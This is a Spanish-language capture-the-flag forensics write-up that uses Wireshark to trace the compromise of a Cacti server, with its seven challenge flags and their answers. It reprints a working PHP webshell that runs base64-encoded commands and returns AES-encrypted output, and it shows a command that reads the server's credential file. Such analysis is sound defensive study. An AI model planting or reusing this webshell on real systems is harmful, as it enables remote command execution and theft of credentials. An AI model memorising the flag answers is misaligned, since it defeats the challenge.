#  Trail of Snow and Deception  
### *Forensics Write-Up*

---

##  Información general

- **Categoría:** Forensics  
- **Número de flags:** 7  
- **Escenario:** Análisis de tráfico de red tras un compromiso en un servidor Cacti  
- **Objetivo:** Identificar el vector de ataque, los artefactos maliciosos y la información sensible exfiltrada.

---

##  Enunciado (traducción)

Oliver Mirth, el experto forense de Tinselwick, seguía un rastro de polvo brillante que se perdía entre la nieve. No había huellas ni signos de lucha. La luz del Snowglobe en lo alto de la torre Sprucetop parpadeaba débilmente.

“Alguien ha estado manipulando la magia”, murmuró Oliver.

Aunque el rastro había desaparecido, el misterio no había hecho más que empezar.

¿Podrá Oliver descubrir el secreto detrás del brillo que se desvanece?

---

##  Metodología

El análisis se realizó sobre un archivo **PCAP**, utilizando principalmente:

- **Wireshark**
- Decodificación **Base64**
- **OpenSSL** para descifrado AES
- Análisis manual de flujos HTTP

Se investigaron:

- Peticiones HTTP sospechosas  
- Ejecución remota de comandos  
- Webshells PHP  
- Exfiltración de información del sistema  

---

##  Flag 1 – Versión de Cacti

**Pregunta:**  
What is the Cacti version in use?

###  Análisis

Inspeccionando respuestas HTTP del servidor, se observó claramente la versión de Cacti en el contenido HTML.

Para ello lo que hemos hecho es filtrar en wireshark por `http.request.uri contains "cacti"`, luego he analizado el primer frame y le he dado a **Follow HTTP Stream**.  
Para buscar la version he hecho **Ctrl + F** y buscar `cactiVersion` y ahi me ha salido la version.

<img width="1263" height="1080" alt="image" src="https://github.com/user-attachments/assets/f55067b2-dc1b-4c20-ae2b-a7bf058965b6" />

### ✅ Flag


```

HTB{1.2.28}

```

---

##  Flag 2 – Credenciales de acceso

**Pregunta:**  
What is the set of credentials used to log in to the instance?

###  Análisis

Revisando peticiones HTTP POST al endpoint de login de Cacti, se detectaron credenciales enviadas en texto plano.

Parecido a antes `http.request.method contains==POST`

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/105ed397-06c4-4221-97c8-bd20ef03efd7" />

### ✅ Flag

```

HTB{mernie.thistlewhip:Z4ZP_8QzKA}

```

---

##  Flag 3 – Archivos PHP maliciosos

**Pregunta:**  
Three malicious PHP files are involved in the attack. In order of appearance in the network stream, what are they?

###  Análisis

Aplicando filtros en Wireshark (`http.request.uri contains ".php"`) y centrándonos en rutas  `/cacti/`, se identificaron tres archivos php con nombres aleatorios.

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f3946216-8e00-41e9-958c-4efb5e9d563a" />

El orden de aparición fue:

1. `JWUA5a1yj.php`  
2. `ornF85gfQ.php`  
3. `f54Avbg4.php`  

### ✅ Flag

```

HTB{JWUA5a1yj.php,ornF85gfQ.php,f54Avbg4.php}

```

---

##  Flag 4 – Archivo descargado con curl

**Pregunta:**  
What file gets downloaded using curl during exploitation process?

###  Análisis

Filtrando peticiones con el User-Agent `curl/8.5.0`, se observó la descarga directa de un archivo ejecutable durante el proceso de explotación.

En wireshark, `http.user_agent contains "curl"`

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f37bbdee-b82c-4dfb-b0c9-9e45b8d47232" />

### ✅ Flag

```

HTB{bash}

````

---

##  Flag 5 – Variable que almacena la salida del comando

**Pregunta:**  
What is the name of the variable in one of the three malicious PHP files that stores the result of the executed system command?

###  Análisis

En wireshark si vamos al frame del `/bash` de la flag numero 4 y hacermos **HTTP Stream** podemos observar lo siguiente:

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/40e24cea-239a-45bd-8f26-4bee8a898ec0" />

```php
<?php $A4gVaGzH = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G";
$A4gVaRmV = "pZ7qR1tLw8Df3XbK";$A4gVaXzY = base64_decode($_GET["q"]);
$a54vag = shell_exec($A4gVaXzY);
$A4gVaQdF = openssl_encrypt($a54vag,"AES-256-CBC",$A4gVaGzH,OPENSSL_RAW_DATA,$A4gVaRmV);
echo base64_encode($A4gVaQdF); ?>
````

El atacante envía un comando codificado en Base64 mediante el parámetro `q` en la URL (`$_GET["q"]`).
El código PHP decodifica ese comando y lo guarda en la variable `$A4gVaXzY`.
Luego, el comando se ejecuta en el sistema usando `shell_exec()`.
La salida del comando se almacena en la variable `$a54vag`.
Esa salida se cifra con AES-256-CBC usando una clave (`$A4gVaGzH`) y un vector de inicialización (`$A4gVaRmV`).
El resultado cifrado se codifica en Base64 y se devuelve al atacante en la respuesta HTTP.

En resumen:
El webshell recibe comandos ocultos en Base64, los ejecuta, cifra la salida y la envía de vuelta codificada. Esto complica el análisis porque no basta con leer el tráfico: hay que descifrarlo para entender qué se ejecutó.

```php
$a54vag = shell_exec($A4gVaXzY);
```

La variable que almacena la salida del comando es `$a54vag`.

### ✅ Flag

```
HTB{$a54vag}
```

---

##  Flag 6 – Hostname del sistema

**Pregunta:**
What is the system machine hostname?

###  Análisis

`http.request.uri contains "f54Avbg4"`

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b1aa1fdc-d5c6-4564-81ce-b11e54bbe683" />

Si hacermos **HTTP Stream**:

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/411aad90-cfb3-4cb3-b6b4-fcdd70004800" />

El atacante ejecutó remotamente el comando `hostname`.
La respuesta estaba cifrada con **AES-256-CBC** y codificada en **Base64**, utilizando las claves embebidas en el webshell.

Tras el descifrado, el resultado fue:

```
tinselmon01
```

### ✅ Flag

```
HTB{tinselmon01}
```

---

##  Flag 7 – Contraseña de la base de datos de Cacti

**Pregunta:**
What is the database password used by Cacti?

###  Análisis

Si hacemos `http.request.uri contains "f54Avbg4"`
Encontramos el `config.php`

```bash
cat include/config.php
```

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f010b637-40c6-41ea-b052-fb88d8a48914" />

El response HTTP:

* Estaba marcado como *ignored* en Wireshark
* Usaba `Transfer-Encoding: chunked`
* Estaba cifrado con AES-256-CBC

Seguimos el **HTTP Stream** del frame:

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/65619c91-e578-4b14-8236-813b52244eb7" />

Tras decodificar y descifrar el contenido, se obtuvo el archivo `include/config.php`, donde aparecía la contraseña de la base de datos.

### ✅ Flag

```
HTB{cactiP@ssw0rd!}
```
